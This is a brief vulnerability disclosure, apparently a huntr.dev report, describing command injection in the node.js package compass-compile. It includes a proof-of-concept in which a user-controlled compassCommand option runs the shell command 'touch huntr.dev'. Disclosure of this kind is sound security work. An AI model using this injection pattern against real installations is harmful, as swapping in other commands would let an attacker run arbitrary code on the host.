# Overview
`compass-compile` is a Compass wrapper for node.js, this package aisre vulnerable to Command Injection, the options argument can be controlled by users without any sanitization.

# Proof of Concept
```
var Root = require('compass-compile');
var root = new Root();
var options = {
  compassCommand:"touch huntr.dev"
}
root.compile(options);
```